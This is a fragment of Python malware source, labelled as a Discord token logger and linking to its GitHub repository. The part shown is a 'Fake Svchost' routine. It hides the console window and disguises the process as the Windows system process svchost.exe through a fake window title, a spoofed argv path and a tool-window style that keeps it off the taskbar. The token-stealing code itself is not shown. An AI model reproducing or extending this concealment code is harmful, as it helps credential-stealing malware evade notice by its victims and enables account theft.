# Token Logger - Deadconvicess
# Github - https://github.com/deadconvicess/Discord-Token-Logger



# Fake Svchost 
import ctypes, os, sys, random, string
def svchost():
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    user32 = ctypes.WinDLL("user32", use_last_error=True)
    shell32 = ctypes.WinDLL("shell32", use_last_error=True)
    hwnd = kernel32.GetConsoleWindow()
    if hwnd:
        user32.ShowWindow(hwnd, 0)  
    try:
        ctypes.windll.shcore.SetProcessDpiAwareness(2)
    except Exception:
        pass 
    random_title = "svchost.exe - " + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    kernel32.SetConsoleTitleW(ctypes.c_wchar_p(random_title))
    sys.argv[0] = "C:\\Windows\\System32\\svchost.exe"
    GWL_EXSTYLE = -20
    WS_EX_TOOLWINDOW = 0x00000080
    user32.SetWindowLongW(hwnd, GWL_EXSTYLE, user32.GetWindowLongW(hwnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW)
    try:
        os.chdir(os.path.expandvars("%SystemRoot%\\System32"))
    except:
        pass
